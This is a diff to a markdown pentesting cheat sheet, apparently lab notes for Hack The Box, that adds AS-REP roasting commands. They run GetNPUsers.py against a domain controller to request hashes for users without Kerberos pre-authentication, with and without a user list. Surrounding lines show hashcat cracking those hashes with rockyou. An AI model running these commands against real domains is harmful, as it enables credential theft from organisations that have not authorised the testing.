@@ -205,6 +205,18 @@ to crack it we can use hashcat with code `18200`
 sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
 ```
 
+<mark style="color:yellow;">**Don't have a password but have a user list?**</mark> We can check for users that don't require kerberos pre-authentication
+
+```
+GetNPUsers.py -dc-ip htb.local -request 'htb.local/'
+```
+
+We can also try to upload a userfile
+
+```
+GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+```
+
 ### Kerberoasting
 
 Suppose we perform a kerberoasting attack over a windows AD
